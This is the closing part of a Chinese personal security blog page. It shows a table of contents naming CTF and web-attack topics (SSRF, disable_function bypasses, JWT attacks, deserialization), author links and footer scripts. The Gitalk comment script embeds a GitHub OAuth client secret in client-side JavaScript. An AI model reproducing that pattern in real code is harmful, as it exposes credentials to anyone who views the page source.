href="#13-3-3-1-1-IDA%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E2%80%94%E2%80%94%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D"><span class="nav-text">13.3.3.1.1 IDA工作原理——模式匹配</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-3-3-1-2-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%8C%B9%E9%85%8D"><span class="nav-text">13.3.3.1.2 正则表达式的匹配</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-3-2-%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B"><span class="nav-text">13.3.3.2 异常检测</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-3-4-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%88%86%E7%B1%BB%E4%B8%8E%E9%83%A8%E7%BD%B2"><span class="nav-text">13.3.4 入侵检测系统的分类与部署</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-4-1-%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%BB%9C%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-NIDS"><span class="nav-text">13.3.4.1 基于网络的入侵检测系统(NIDS)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-4-2-%E5%9F%BA%E4%BA%8E%E5%AE%A1%E8%AE%A1%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-HIDS"><span class="nav-text">13.3.4.2 基于审计的入侵检测系统(HIDS)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-4-3-%E5%88%86%E5%B8%83%E5%BC%8F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-DIDS"><span class="nav-text">13.3.4.3 分布式入侵检测系统(DIDS)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-4-4-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E9%83%A8%E7%BD%B2%E4%BD%8D%E7%BD%AE"><span class="nav-text">13.3.4.4 入侵检测系统的部署位置</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-3-5-%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9FIPS"><span class="nav-text">13.3.5 入侵防御系统IPS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-3-6-%E8%91%97%E5%90%8D%E7%9A%84%E5%BC%80%E6%BA%90%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-Snort"><span class="nav-text">13.3.6 著名的开源入侵检测系统-Snort</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-6-1-Snort%E6%A6%82%E8%BF%B0"><span class="nav-text">13.3.6.1 Snort概述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-6-2-Snort%E7%BB%93%E6%9E%84"><span class="nav-text">13.3.6.2 Snort结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-6-3-Snort%E8%A7%84%E5%88%99%E7%BB%93%E6%9E%84"><span class="nav-text">13.3.6.3 Snort规则结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-6-4-Snort%E5%85%B8%E5%9E%8B%E8%A7%84%E5%88%99%E7%A4%BA%E4%BE%8B"><span class="nav-text">13.3.6.4 Snort典型规则示例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-4-R%EF%BC%9A%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF"><span class="nav-text">13.4 R：响应技术</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#14-HTTP"><span class="nav-text">14. HTTP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#14-1-%E6%8A%93%E5%8C%85%E5%85%B3%E9%94%AE%E7%82%B9"><span class="nav-text">14.1 抓包关键点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-2-Tornado%E6%A1%86%E6%9E%B6"><span class="nav-text">14.2 Tornado框架</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-3-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="nav-text">14.3 备份文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#14-3-1-vim%E7%BC%93%E5%AD%98"><span class="nav-text">14.3.1 vim缓存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-3-2-DS-Store%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="nav-text">14.3.2 .DS_Store文件利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-4-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="nav-text">14.4 弱类型绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-5-%E5%BA%8F%E5%88%97%E5%8F%B7%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">14.5 序列号与反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-6-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">14.6 伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#14-6-1-data-text-plain"><span class="nav-text">14.6.1 data:&#x2F;&#x2F;text&#x2F;plain</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-6-2-php-input"><span class="nav-text">14.6.2 php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-6-3-php-filter"><span class="nav-text">14.6.3 php:&#x2F;&#x2F;filter</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-7-%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="nav-text">14.7 请求方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-8-302%E8%B7%B3%E8%BD%AC"><span class="nav-text">14.8 302跳转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-9-Cookie"><span class="nav-text">14.9 Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-10-%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81"><span class="nav-text">14.10 基本认证</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#15-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-text">15. 信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#15-1-Git%E6%B3%84%E9%9C%B2"><span class="nav-text">15.1 Git泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#15-1-1-Log"><span class="nav-text">15.1.1 Log</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-1-2-Stash"><span class="nav-text">15.1.2 Stash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-1-3-Index"><span class="nav-text">15.1.3 Index</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-2-SVN%E6%B3%84%E9%9C%B2"><span class="nav-text">15.2 SVN泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-3-HG%E6%B3%84%E9%9C%B2"><span class="nav-text">15.3 HG泄露</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#16-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-SSRF"><span class="nav-text">16. 服务端请求伪造(SSRF)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#16-1-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="nav-text">16.1 内网访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-2-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-text">16.2 伪协议读取文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-3-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">16.3 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-4-POST%E8%AF%B7%E6%B1%82"><span class="nav-text">16.4 POST请求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-5-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-text">16.5 上传文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-6-FastCGI%E5%8D%8F%E8%AE%AE"><span class="nav-text">16.6 FastCGI协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-7-URL-Bypass"><span class="nav-text">16.7 URL Bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-8-%E6%95%B0%E5%AD%97IP-Bypass"><span class="nav-text">16.8 数字IP Bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-9-302%E8%B7%B3%E8%BD%AC-Bypass"><span class="nav-text">16.9 302跳转 Bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-10-DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB"><span class="nav-text">16.10 DNS重绑定攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#17-Bypass-disable-function"><span class="nav-text">17.  Bypass disable_function</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#17-1-LD-PRLOAD"><span class="nav-text">17.1 LD_PRLOAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-2-ShellShock"><span class="nav-text">17.2 ShellShock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-3-Apache-Mod-CGI"><span class="nav-text">17.3 Apache Mod CGI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-4-PHP-FPM"><span class="nav-text">17.4 PHP-FPM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-5-GC-UAF"><span class="nav-text">17.5 GC UAF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-6-Json-Serializer-UAF"><span class="nav-text">17.6  Json Serializer UAF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-7-Backtrace-UAF"><span class="nav-text">17.7 Backtrace UAF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-8-FFI-%E6%89%A9%E5%B1%95"><span class="nav-text">17.8  FFI 扩展</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-9-iconv"><span class="nav-text">17.9 iconv</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#18-JSON-Web-Token"><span class="nav-text">18. JSON Web Token</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#18-1-%E6%97%A0%E7%AD%BE%E5%90%8D"><span class="nav-text">18.1 无签名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-2-%E5%BC%B1%E5%AF%86%E9%92%A5"><span class="nav-text">18.2 弱密钥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-3-%E4%BF%AE%E6%94%B9%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95"><span class="nav-text">18.3 修改签名算法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#19-PHP"><span class="nav-text">19. PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#19-1-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">19.1 序列化与反序列化</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#20-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="nav-text">20. 模板注入</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="v5le0n9"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">v5le0n9</p>
  <div class="site-description" itemprop="description">小呀小二郎呀背着个书包上学堂</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">70</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/Leong_Vinson" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leong_Vinson" rel="noopener" target="_blank"><i class="fab fa-cuttlefish fa-fw"></i>CSDN</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/v5le0n9" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;v5le0n9" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:v5le0n9@163.com" title="E-Mail → mailto:v5le0n9@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      友链
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.zz1syyd.com/" title="https:&#x2F;&#x2F;www.zz1syyd.com&#x2F;" rel="noopener" target="_blank">zz1syyd</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://one-null-pointer.github.io/" title="https:&#x2F;&#x2F;one-null-pointer.github.io&#x2F;" rel="noopener" target="_blank">liaoyue</a>
        </li>
    </ul>
  </div>

      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">v5le0n9</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">1.4m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">21:03</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : '7c58e80079a2457b610d',
      clientSecret: 'fc16b1b0fdfb278016ebe41c20f3743c3c927466',
      repo        : 'comments.github.io',
      owner       : 'v5le0n9',
      admin       : ['v5le0n9'],
      id          : '5633bee4b9c7c53d9f6211ba7fe89cff',
        language: 'zh-CN',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
